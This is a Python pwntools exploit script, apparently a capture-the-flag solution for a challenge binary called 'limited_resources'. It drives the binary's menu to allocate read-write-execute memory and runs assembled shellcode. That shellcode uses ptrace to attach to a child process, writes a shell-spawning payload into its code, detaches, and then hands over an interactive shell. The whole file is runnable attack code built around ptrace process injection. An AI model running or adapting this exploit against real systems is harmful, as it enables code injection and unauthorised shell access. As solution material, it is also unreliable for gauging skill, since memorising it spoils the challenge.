#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './limited_resources_patched'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def create_memory(sz, perm, data):
    io.sendlineafter("Exit", str(1))
    io.sendlineafter("to be?", str(sz))
    io.sendlineafter("memory?", str(perm))
    io.sendlineafter("include?", data)

    leak = io.recvuntil("to do:")
    addr = re.search(b"0[xX][0-9a-fA-F]+", leak)

    return int(addr.group(0), 0x10)

def get_info():
    io.sendlineafter("Exit", str(2))
    leak = io.recvuntil("to do:")
    pid = re.search(b"\d+", leak)
    return int(pid.group(0), 10)

def execute_code(addr):
    io.sendlineafter("Exit", str(3))
    io.sendlineafter("code?", hex(addr))

def ptrace_attach(pid):
    PTRACE_ATTACH = 16
    sc = f'''
        mov rdi, {PTRACE_ATTACH}
        mov rsi, {pid}
        xor rdx, rdx
        xor r10, r10

        mov rax, 0x65
        syscall

    '''

    return sc

def ptrace_detach(pid):
    PTRACE_DETACH = 17
    sc = f'''
        mov rdi, {PTRACE_DETACH}
        mov rsi, {pid}
        xor rdx, rdx
        xor r10, r10
        
        mov rax, 0x65
        syscall

    '''

    return sc

def ptrace_pokedata(pid, addr, val):
    PTRACE_POKEDATA = 5
    sc = f'''
        mov rdi, {PTRACE_POKEDATA}
        mov rsi, {pid}
        mov rdx, {addr}
        mov r10, {val}

        mov rax, 0x65
        syscall

    '''

    return sc

def sc_wait():
    sc = '''
        mov rcx,0xffffffff
    wait:
        nop
        nop
        loop wait

    '''

    return sc

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

perm = 0x1 | 0x2 | 0x4

io = start(argv, env=env)

pid = get_info()

log.info(f"Child pid: {pid}")

start = 0x04018df
payload = asm(shellcraft.sh())

sc = ptrace_attach(pid)
sc += sc_wait()

off = 0
for part in group(8, payload):
    tmp = part.ljust(8, b"\x90")
    sc += ptrace_pokedata(pid, start + off, u64(tmp))
    off += 8

sc += ptrace_detach(pid)

sc += '''
    loopit:
        jmp loopit
'''
#sc += "int3"

sc = asm(sc)

log.info(f"sc len: {len(sc)}")

addr =create_memory(0x200, perm, sc)

log.info(f"Mem addr: {hex(addr)}")

execute_code(addr)

io.interactive()

